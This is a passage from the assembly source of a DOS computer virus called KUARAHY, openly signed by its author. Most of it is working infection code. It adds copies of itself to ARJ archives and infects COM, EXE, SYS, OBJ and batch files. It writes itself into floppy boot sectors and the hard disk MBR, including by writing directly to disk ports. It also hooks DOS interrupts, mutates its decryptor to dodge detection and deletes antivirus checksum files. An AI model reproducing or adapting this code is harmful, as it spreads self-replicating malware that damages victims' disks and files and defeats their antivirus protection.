           jmp     PopAll



           db      'HOMO ¨SAPIENS? HAHAHA!'



   InfectarARJ:                            ; .ARJ infection
           call    Segmentos
           mov     di,offset Agregar       ; Points to the name
           mov     cx,5
   Changear:                               ; Generates random name for the
           push    cx                      ; file that we will add to the .ARJ
           mov     cx,25                   ; RND between 0-25
           call    Get_RND
           add     ax,64                   ; A-Z
           stosb
           pop     cx
           loop    Changear

           mov     word ptr [ClaveB],0     ; Put 0 value in both decryptors
           mov     word ptr [ClaveF],0

           mov     ax,4202h
           xor     cx,cx                   ; Go to EOF
           cwd
           int     21h

           sub     ax,4
           sbb     dx,0
           mov     cx,dx                   ; Move our pointer
           mov     dx,ax
           xchg    dx,ax
           mov     ax,4200h
           int     21h

           mov     cx,Largor               ; Set both com & uncompresed size
           mov     word ptr [SizeComprimido],cx
           mov     word ptr [RealSize],cx

           sub     si,si                   ; Thanx Qark for ARJDropper!
           call    CRC32

           mov     cx,offset Omega-offset Signatura
           mov     si,offset Signatura
           mov     di,offset Temporal
           rep     movsb

           mov     word ptr [CRC],ax       ; Store CRC 32
           mov     word ptr [CRC+2],dx

           mov     cx,word ptr [BhTamanio]
           mov     si,offset [FhTamanio]
           call    CRC32                   ; Calculate again
           mov     word ptr [aCRC],ax
           mov     word ptr [aCRC+2],dx

           mov     cx,offset Fdata-offset Signatura
           mov     dx,offset Signatura
           mov     ah,40h                  ; Write to the ARJ
           int     21h

           mov     cx,offset Signatura
           xor     dx,dx
           mov     ah,40h
           int     21h

           mov     cx,offset Omega-offset Signatura
           mov     dx,offset Temporal
           mov     ah,40h
           int     21h

           mov     cx,4
           mov     dx,offset Fdend         ; Finish ARJ infection
           mov     ah,40h
           int     21h

           jmp     SalteAqui



   Reatributear:                           ; Restore attribs using SFT
           les     di,dword ptr cs:[SFT]
           mov     cl,byte ptr cs:[AtribsFile]
           mov     byte ptr es:[di+4],cl
           ret



   SaltarAdondeCorresponda:                ; Check out what to infect
           cmp     ax,'ZM'
           je      InfectarEXE
           cmp     ax,'MZ'                 ; EXE
           je      InfectarEXE
           cmp     byte ptr [QueEs],'C'    ; It is COM?
           je      InfectarCOM
           cmp     al,080h                 ; Begings with 80h? It is an OBJ
           je      InfectarOBJ
           inc     ax
           jz      InfectarSYS             ; FFFF+1=0  then device driver?
           cmp     byte ptr [QueEs],'B'    ; Is a batch one
           je      InfectarBAT
           cmp     byte ptr [QueEs],'A'    ; ARJ file
           je      InfectarARJ
           jmp     Cerrar



   Contador   dw  0                        ; Infection counter
   Copyright  db 13,10,' [KUARAHY by Int13h] - Written in the Republic of Paraguay - Please register! ',13,10,'$'
   Hehe       db 2,'DOS Infection Device',2
   Bandera    db 'N'
   Salto      db 0e9h,00h,00h              ; 4 jmp construction

              db ' Learn some guaran¡ words!:'
              db 'Kuarahy=Sun  A¤ =Devil  Ku¤ =Woman '

   Vafer      db 090h,0cdh,020h            ; Original COM bytes
   Targets    db 'execomsysobjbatovlarj'   ; Infectable extensions
   QueEs      db 'E'                       ; Hoste flag
              Real21h dw 0,0               ; Original 21h handler



   PongoFecha:
           inc     word ptr cs:[Contador]  ; Update counter
           mov     ax,5701h
           db      0b9h
           Time    dw 0                    ; Restore date/time and mark as
           and     cl,11100000b            ; an infected one
           or      cl,00011110b
           db      0bah
           Date    dw 0
           pushf
           call    dword ptr cs:[Real21h]
           ret



           db      ' E-mail me: Int13h@antisocial.com '



   AlInicio:                               ; For pointer movements
           mov     ax,04200h
           jmp     short Despl
   AlFinal:mov     ax,04202h
   Despl:  xor     cx,cx
           cwd
           int     21h
           ret



   Segmentos:                              ; DS:=CS  &  ES:=CS
           push    cs cs
           pop     ds es
           ret



   Get_RND:push    dx                      ; Random # Generator
           push    di
           in      ax,40h
           mov     dx,106
           mul     dx
           add     ax,1283
           mov     di,6075
           adc     dx,0
           div     di
           mov     ax,dx
           mul     cx
           div     di
           pop     di
           pop     dx
           inc     ax
           ret



   Hookear_Int21h:                         ; Try to hook int 21h
           cmp     byte ptr cs:[Revisar],'S'
           jne     Retornemos              ; Check the flag...
           inc     byte ptr cs:[Cuenta]    ; Update our counter
           cmp     byte ptr cs:[Cuenta],8  ; 8 writes, we will hook Int 21h then
           jbe     Retornemos

           push    ds
           push    ax
           push    bx

           xor     ax,ax
           mov     ds,ax                   ; DS=IVT
           mov     ax,word ptr ds:[21h*4]  ; Fill our vars
           mov     bx,word ptr ds:[(21h*4)+2]
           mov     word ptr cs:[Abuela21h],ax
           mov     word ptr cs:[Abuela21h+2],bx
           mov     word ptr cs:[Real21h],ax
           mov     word ptr cs:[Real21h+2],bx

           cli                             ; Hook Int 21h
           mov     word ptr ds:[21h*4],offset Viral21Handler
           mov     word ptr ds:[(21h*4)+2],cs
           sti

           mov     byte ptr cs:[Cuenta],0  ; Clear counter
           mov     byte ptr cs:[Revisar],'N'
           pop     bx
           pop     ax
           pop     ds
   Retornemos:
           jmp     Normal                  ; Normal INT 13h



   Encriptor:                              ; Virus's encryptor
           call    Segmentos
           mov     word ptr [Puntero],bp   ; Pointer for 2§ decryptor
           sub     bp,01c2h                ; Calculate the pointer for
           mov     word ptr [Pointer],bp   ; 1§ decryptor

           in      al,40h
           xchg    ah,al
           in      al,40h                  ; Get keyword for 2§ decryptor
           mov     word ptr [ClaveF],ax

           xor     si,si
           mov     di,offset CopiaVirus
           mov     cx,Longitud             ; Copy virus to buffer
           rep     movsb

           mov     si,offset CopiaVirus+020fh
           mov     ax,word ptr [ClaveF]
           mov     cx,((Largor-200h)-0fh)/2
   Proseguir:
           xor     word ptr [si],ax        ; Encrypt Kuarahy
           inc     si
           inc     si
           loop    Proseguir

           in      al,40h
           xchg    ah,al
           in      al,40h                  ; Get keyword for 1§ decryptor
           mov     word ptr [ClaveB],ax

           mov     cx,300                  ; Get a random operation XOR/SUB/ADD
           call    Get_RND
           mov     di,offset ClaveB-2
           cmp     ax,100
           ja      SUBEAR
           mov     cl,1                    ; XOR
           mov     ax,03481h
           stosw
           mov     di,offset Rotar
           mov     ax,0431h
           stosw
           jmp     Oima
   SUBEAR: cmp     ax,200
           ja      ADDEAR
           mov     cl,2                    ; SUB
           mov     ax,02c81h
           stosw
           mov     di,offset Rotar
           mov     ax,0401h
           stosw
           jmp     Oima
   ADDEAR: mov     cl,3                    ; ADD
           mov     ax,00481h
           stosw
           mov     di,offset Rotar
           mov     ax,0429h
           stosw

   Oima:   xor     ch,ch                   ; Choose new pointer
           mov     di,offset Pointer-1
           push    cx
           mov     cx,255
           call    Get_RND
           pop     cx
           cmp     al,80
           ja      UsarSI                  ; BX
           mov     al,0bbh
           stosb
           mov     di,offset ClaveB+2
           mov     ax,04343h
           stosw
           mov     di,offset ClaveB-1
           mov     si,offset TablaBX-1
           add     si,cx
           movsb
           jmp     Oikoma
   UsarSI: cmp     al,160
           ja      UsarDI                  ; SI
           mov     al,0beh
           stosb
           mov     di,offset ClaveB+2
           mov     ax,04646h
           stosw
           mov     di,offset ClaveB-1
           mov     si,offset TablaSI-1
           add     si,cx
           movsb
           jmp     Oikoma
   UsarDI: mov     al,0bfh                 ; DI
           stosb
           mov     di,offset ClaveB+2
           mov     ax,04747h
           stosw
           mov     di,offset ClaveB-1
           mov     si,offset TablaDI-1
           add     si,cx
           movsb

   Oikoma: xor     si,si                   ; Write the new 1§ decryptor over
           mov     di,offset CopiaVirus    ; the buffer
           mov     cx,offset Encriptado
           rep     movsb

           mov     si,offset CopiaVirus
           add     si,offset Encriptado
           mov     ax,word ptr [ClaveB]
           mov     cx,0d8h
   Rotar:  xor     word ptr [si],ax        ; Encrypt first part (BS/MBR one)
           inc     si
           inc     si
           loop    Rotar

           cmp     byte ptr cs:[QueEs],'b' ; Flag checking
           jne     Voltemos

           mov     si,offset CopiaVirus
           add     si,offset Pointer       ; Fix the pointer for BS/MBR copy
           mov     word ptr [si],offset Encriptado+07c00h
   Voltemos:
           ret



   Checar_Ext:
           mov     si,offset Cabecera
           or      word ptr [si],02020h    ; Lowercase extension
           or      word ptr [si+2],020h
           mov     di,offset Targets       ; And check if it matchs with one
   Otro:   mov     si,offset Cabecera      ; of the 7 we can manage
           cmp     di,offset Targets+21
           ja      Ninguno
           mov     cx,3
           rep     cmpsb
           jnz     Otro
           cmp     di,offset Targets+3
           je      Exe
           cmp     di, offset Targets+6
           je      Com
           cmp     di,offset Targets+9
           je      Sys
           cmp     di,offset Targets+12
           je      Obj
           cmp     di,offset Targets+15
           je      Bat
           cmp     di,offset Targets+18
           je      Ovl
           cmp     di,offset Targets+21
           je      Arj
   Ninguno:mov     byte ptr [QueEs],'X'    ; :(
           stc
           ret

   Exe:    mov     al,'E'                  ; EXE
           jmp     EternoRetorno
   Com:    mov     al,'C'                  ; COM
           jmp     EternoRetorno
   Sys:    mov     al,'S'                  ; SYS
           jmp     EternoRetorno
   Obj:    mov     al,'O'                  ; OBJ
           jmp     EternoRetorno
   Bat:    mov     al,'B'                  ; BAT
           jmp     EternoRetorno
   Ovl:    mov     al,'E'                  ; OVL
           jmp     EternoRetorno
   Arj:    mov     al,'A'                  ; ARJ
   EternoRetorno:
           mov     byte ptr [QueEs],al
           mov     ds,bx
           clc
           ret



   Lectura:mov     ah,3fh                  ; Read OBJ field descriptor
           mov     cx,3
           mov     dx,offset Buffer
           int     21h
           mov     dx,word ptr ds:[Buffer+1]
           mov     al,byte ptr ds:[Buffer]
           ret



   CRC32:  push    bx cx si di
           call    Generar_Tabla           ; Generate CRC 32 table
           mov     dx,0ffffh
           mov     ax,0ffffh
   CRC32loop:
           sub     bx,bx
           mov     bl,byte ptr [si]
           inc     si
           xor     bl,al
           shl     bx,1
           shl     bx,1
           mov     al,ah
           mov     ah,dl
           mov     dl,dh
           xor     dh,dh
           xor     ax,word ptr [bx+offset CopiaVirus]
           xor     dx,word ptr [bx+offset CopiaVirus+2]
           dec     cx
           jnz     CRC32loop

           xor     dx,0ffffh
           xor     ax,0ffffh
           pop     di si cx bx
           ret



   Albirroja       db "PARAGUAY WORLD CUP '98"  ; This is the rite one, RJ :)



   Chequeo:mov     ax,013cdh               ; Yes, we are TSR
           mov     bx,cs
           iret



   Generar_Tabla:                          ; Generates the CRC 32 table
           push    ax cx dx di
           mov     di,offset CopiaVirus    ; Buffer where the table will be
           xor     cx,cx                   ; created
   Carrusell:
           xor     dx,dx
           xor     ax,ax
           mov     al,cl
           push    cx
           mov     cx,8
   Calculo:clc
           rcr     dx,1
           rcr     ax,1
           jnc     NoXORear
           xor     dx,0edb8h
           xor     ax,8320h
   NoXORear:
           loop    Calculo
           mov     word ptr [di],ax
           mov     word ptr [di+2],dx
           add     di,4
           pop     cx
           inc     cx
           cmp     cx,100h
           jne     Carrusell
           pop     di dx cx ax
           ret



   Kill_Tunnel:
           push    ds si ax bx
           pushf
           pop     ax
           and     ah,11111110b            ; Turn off the trap flag
           push    ax
           popf
           sub     ax,ax
           mov     ds,ax
           mov     bx,4
           lds     si,[bx]
           mov     byte ptr [si],0cfh      ; Put an IRET in the INT 1 handler
           pop     bx ax si ds
           ret



   Infectar:                               ; Floppy infection routine
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           jc      Error_de_Lectura

           cmp     word ptr es:[bx+offset Marca],0f7e2h
           je      Stealth_BS              ; If already infected, stealth it

           cmp     word ptr es:[bx+13h],0b40h
           jne     Error_de_Lectura        ; FD 1.44mb?   2880 sectors

           pushf
           push    ax bx cx dx si di

           mov     byte ptr cs:[DondeEstamos],'F'
           push    es
           push    ds
           push    es
           pop     ds
           push    cs
           pop     es

           lea     si,[bx+3]               ; Save BPB values of the floppy
           mov     di,3
           mov     cx,3bh
           rep     movsb

           pop     ds
           pop     es

           call    Format_an_extra_track   ; Create our new cylinder in A:

           mov     ax,0301h                ; Write original BS to sector 1
           sub     dx,dx                   ; Head 0
           mov     cx,05001h               ; Track 80, sector 1
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           mov     ax,0301h
           pushf
           call    dword ptr cs:[Offset_de_la_13h]

           push    es
           push    cs
           pop     es

           mov     byte ptr cs:[QueEs],'b' ; Modify our flag
           push    bp ds es
           mov     bp,020fh
           call    Encriptor               ; Give me an encrypted copy
           pop     es ds bp

           mov     ax,0308h                ; Write the virus in the contiguos
           mov     cx,5002h                ; sectors of our track 80
           mov     bx,offset CopiaVirus+200h
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           mov     ax,0308h
           pushf
           call    dword ptr cs:[Offset_de_la_13h]

           mov     ax,0301h
           mov     cx,0001h                ; Write virus first part to BS
           xor     dx,dx
           mov     bx,offset CopiaVirus
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           pop     es

           pop     di si dx cx bx ax
           popf
           Error_de_Lectura:
           retf    2



           db      3,'Rohaih£ Paraguay!',3 ; Guaran¡ language r0x0r!!!



   Format_an_extra_track:                  ; The extra track kreator
           push    ds es bx
           push    cs cs
           pop     ds es
           xor     ax,ax
           mov     ds,ax                   ; DS=IVT
           mov     si,01eh*4
           mov     di,offset Vieja1eh      ; Copy old Int 1eh address (ddpt)
           movsw
           movsw
           mov     es,ax
           mov     di,01eh*4
           mov     ax,offset FDHD35        ; Hook Int 1eh, points to our own table
           stosw
           mov     ax,cs
           stosw

           push    cs cs
           pop     ds es

           mov     di,offset Tabla         ; Generation of the little table
           mov     cx,0201h
    Fabricar_Tabla:
           mov     ax,0050h                ; 50h=80d, our new track
           stosw                           ; 0 is for the head 0
           mov     ax,cx                   ; CH=02, 512 bytes x sector
           stosw
           inc     cl                      ; INC sector counter
           cmp     cx,0209h
           jbe     Fabricar_Tabla

           xor     ax,ax
           int     13h

           mov     ax,0509h                ; Format 9 sectors
           mov     bx,offset Tabla
           mov     cx,05001h               ; Track 80, from sector #1
           xor     dx,dx                   ; Head 0, drive A:
           int     13h

           xor     ax,ax
           mov     es,ax
           mov     si,offset Vieja1eh      ; Restore Int 1eh
           mov     di,1eh*4
           movsw
           movsw

           pop     bx es ds
           ret



   InfectarMBR:                            ; MBR infector procedure
           push    ax bx cx dx si di bp ds es

           push    cs cs
           pop     ds es

           cmp     byte ptr es:[Bandera],'N'
           jne     Adios                   ; Already infected in previous ocasion

           mov     ax,0201h
           mov     bx,offset MBRBS         ; Read MBR
           mov     cx,1
           mov     dx,0080h
           int     13h

           cmp     word ptr [bx+offset Marca],0f7e2h
           jne     SuckIt                  ; Already infected?

   Adios:  pop     es ds bp di si dx cx bx ax
           iret

   SuckIt: mov     byte ptr es:[DondeEstamos],'H'
           mov     byte ptr es:[Bandera],'Y'
           mov     di,32                   ; Check my flag
           call    Reutilizar
           jmp     short Adios



   Direct_HD_Write_Using_Ports:            ; MBR infection via HD ports
           mov     dx,01f2h                ; Initial port
           mov     cx,6                    ; We will go 6 times
           outsb                           ; Send the byte to port
           inc     dx                      ; Next port
           loop    $-2                     ; Repeat

   Esperar:in      al,dx
           test    al,8                    ; Wait...
           jz      Esperar

           mov     si,bx                   ; DS:SI=buffer to write
           mov     cx,256
           mov     dx,1f0h
           repe    outsw                   ; Do it
           ret



   TablaBX db      037h,02fh,07h           ;
   TablaSI db      034h,02ch,04h           ; Tables used to mutate decryptor
   TablaDI db      035h,02dh,05h           ;

   ; Disk device parameter table for our new track
   FDHD35  db      0dfh,2,025h,2,012h,01bh,0ffh,06ch,2,0fh,8

   ; Values that we will send to HD ports
   ParaOuting      db 1,1,0,0,0a0h,30h

   ; Stupid files we will delete in order to free space :)
   Basura1 db      'ANTI-VIR.DAT',0
   Basura2 db      'CHKLIST.MS',0
   Basura3 db      'CHKLIST.CPS',0
   Basura4 db      'AVP.CRC',0

   ; This is the parameter table for 4Bh function
   PSP     dw      0,80h
   SLINEA  dw      0,005ch
   FCB1    dw      0,006ch
   FCB2    dw      0

   RunMe   db      'C:\COMMAND.COM',0

   ; OBJ ending module
   Finalizacion:
           db      08ah,07h,00h,0c1h,010h,01h,01h,00h,01h,09bh

   ; The OBJ record where the virus will go
   VirusOBJRecord:
           db      0a0h
           dw      Largor+3
           db      01
           dw      100h


   ; Insane bitmapped fonts. To change default text mode fonts to a nicer one
   Letras  db      00000000b
           db      00000000b
           db      00111000b
           db      01111100b
           db      11000110b
           db      11000110b
           db      01101100b
           db      11111110b               ; A
           db      11000110b
           db      11000110b
           db      11000110b
           db      01000100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      11111000b
           db      01111100b
           db      01100110b
           db      01100110b
           db      01101110b
           db      11111100b               ; B
           db      01100110b
           db      01100110b
           db      01111110b
           db      11111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00111000b
           db      01111100b
           db      11100110b
           db      01100110b
           db      01100010b
           db      01100000b               ; C
           db      01100010b
           db      11100110b
           db      01111110b
           db      00111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      11110000b
           db      00111000b
           db      00011100b
           db      01001110b
           db      11100110b
           db      01100110b               ; D
           db      01100110b
           db      01100110b
           db      01111100b
           db      11111000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01111000b
           db      11111100b
           db      01100110b
           db      01101010b
           db      11111000b
           db      01101000b               ; E
           db      01100010b
           db      01100110b
           db      11111100b
           db      01111000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01111100b
           db      11111110b
           db      01100010b
           db      01100000b
           db      01101000b               ; F
           db      11111000b
           db      01101000b
           db      01100000b
           db      01100000b
           db      11110000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01111100b
           db      11101110b
           db      01100110b
           db      01100100b
           db      01100000b               ; G
           db      11100010b
           db      01100110b
           db      01101110b
           db      11111110b
           db      01110110b
           db      00000010b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01000010b
           db      01100110b
           db      01100110b
           db      01100110b
           db      11100111b               ; H
           db      01111110b
           db      01100110b
           db      01100110b
           db      01100110b
           db      01000010b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00011000b
           db      00111100b
           db      00111100b
           db      00011000b
           db      00011000b               ; I
           db      00011000b
           db      00011000b
           db      00111100b
           db      00111100b
           db      00011000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00000110b
           db      00001110b
           db      00001110b
           db      01000110b
           db      01100110b               ; J
           db      01110110b
           db      01100110b
           db      01100110b
           db      01100110b
           db      00111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00100010b
           db      01100110b
           db      11100110b
           db      01100110b
           db      01110100b               ; K
           db      01111000b
           db      01101100b
           db      11100110b
           db      01100110b
           db      00100010b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00100000b
           db      01100000b
           db      11100000b
           db      01100000b
           db      01100000b               ; L
           db      01100010b
           db      01100110b
           db      01101110b
           db      01100110b
           db      11111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      10000010b
           db      11000010b
           db      11000110b
           db      11101110b
           db      11111110b
           db      11010110b               ; M
           db      11010110b
           db      11000110b
           db      11000110b
           db      01000100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      10000010b
           db      11000110b
           db      11100110b
           db      11110110b
           db      11011110b               ; N
           db      11001110b
           db      11000110b
           db      11000110b
           db      11000110b
           db      01000010b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00011000b
           db      00111100b
           db      01101110b
           db      01100110b
           db      01100110b
           db      01100110b               ; O
           db      01100110b
           db      01110110b
           db      00111100b
           db      00011000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      11110000b
           db      01111100b
           db      01101110b
           db      01100110b
           db      01100110b
           db      01101110b               ; P
           db      11111100b
           db      01100000b
           db      01100000b
           db      01000000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00110000b
           db      01111100b
           db      11000110b
           db      11000110b
           db      11000110b
           db      11000110b               ; Q
           db      11000110b
           db      11010110b
           db      01111100b
           db      00011000b
           db      00001100b
           db      00000000b

           db      00000000b
           db      00000000b
           db      11111100b
           db      01100110b
           db      01100110b
           db      01100110b
           db      01110100b
           db      01111000b               ; R
           db      01101100b
           db      11100110b
           db      01100110b
           db      00100010b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00111100b
           db      01100110b
           db      01100110b
           db      01100110b
           db      00110010b               ; S
           db      00011000b
           db      0001100b
           db      00100110b
           db      01100110b
           db      10111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00100100b
           db      01111110b
           db      11011011b
           db      10011001b
           db      00011000b
           db      00011000b               ; T
           db      00011000b
           db      00011000b
           db      00011000b
           db      00111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01000010b
           db      01100110b
           db      01100110b
           db      01100110b
           db      01100110b               ; U
           db      01100110b
           db      01100110b
           db      01100110b
           db      01111110b
           db      00111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00100100b
           db      01100110b
           db      01100110b
           db      01100110b
           db      01100110b               ; V
           db      01100110b
           db      01100110b
           db      01100110b
           db      00111100b
           db      00011000b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      10000010b
           db      11000110b
           db      11000110b
           db      11000110b
           db      11010110b
           db      11010110b               ; W
           db      11111110b
           db      11111110b
           db      11101110b
           db      01000100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01000010b
           db      01100110b
           db      00111100b
           db      00011000b
           db      00011000b               ; X
           db      00011000b
           db      00011000b
           db      00111100b
           db      01100110b
           db      01000010b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      01000010b
           db      01100110b
           db      01100110b
           db      00111100b
           db      00011000b
           db      00011000b               ; Y
           db      00011000b
           db      00011000b
           db      00011000b
           db      00111100b
           db      00000000b
           db      00000000b

           db      00000000b
           db      00000000b
           db      00111100b
           db      01100110b
           db      01000110b
           db      00001100b
           db      00011000b               ; Z
           db      01111100b
           db      00110000b
           db      01100010b
           db      01100110b
           db      00111100b
           db      00000000b
           db      00000000b


   Buffer          db 0,0,0                ; Used by the OBJ infection
   Entrada         db 0,0,0                ; procedure
   Linea           db ' /C '

   ; We will write this to the ARJ
   Signatura       db 60h,0eah
   BhTamanio       dw offset aCRC-offset FhTamanio
   FhTamanio       db offset Agregar-offset FhTamanio
   VersionH        db 6
   VersionL        db 1
   OSystem         db 0
   Flags           db 0
   Metodo          db 0                    ; Method: storing
   TipoFile        db 0                    ; Just a normal file
   Ares            db 0
   TimeDate        db 0deh,045h,022h,025h  ; Time+Date
   SizeComprimido  dd 4                    ; Compressed size=Virus size
   RealSize        dd 4                    ; Original size= Virus size :)
   CRC             dd 0
   Fspec           dw 0
   Atributos       dw 0
   HostData        dw 0
   Agregar         db "FONTS.COM",0        ; Name of the file (random)
   Acomm           db 0
   ACRC            dd 0
   Ehsize          dw 0
   Fdata           db "!"


   Fdend:          db 60h,0eah,0,0



   OMEGA:                                  ; End of virus in the file

   BGuardian    dw 0                       ; Best Speed Metal Group!!!
   AtribsFile   dw 0
   Vieja24h     dd 0
   Victima      dd 0
   SFT          dd 0
   Cabecera     db 45d dup(0)
   Temporal     db 52 dup(0)
   FileName     db 128d dup(0)
   CopiaVirus   db Largor dup(0)
   MBRBS        db 512 dup(0)
   Vieja1eh     dd 0
   TABLA        db 36 dup(0)               ; The table will be generated here

   FAKEHOSTE: push     cs                  ; Our sucked hoste :)
              pop      ds

              mov      ah,9                ; Print the message
              mov      dx,offset Imaginations_from_the_other_side
              int      21h

              mov      ax,4c00h            ; Turn back to DOS
              int      21h


   Imaginations_from_the_other_side:       ; Excelent Blind Guardian's album!
           db 13,10,13,10,13,10,13,10
           db "            I came from nowhere",13,10
           db "            without a task, without a name",13,10
           db "            no fear of evil",13,10
           db "            fate, so god please lead me through",13,10
           db "            forgotten realms",13,10
           db "            mysterious dreams",13,10
           db "            in sunless rooms I'd sworn",13,10
           db "            I'll finish what I started, once",13,10
           db "            I'll find my holy grail",13,10
           db "            in the holy land.",13,10,13,10
           db "    The script for my requiem - BLIND GUARDIAN",13,10,13,10
           db "    KUARAHY virus released! Your MBR is infected. Embogues‚ kuarahy?",13,10,13,10,'$'

   END KUARAHY                             ; AT LAST!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
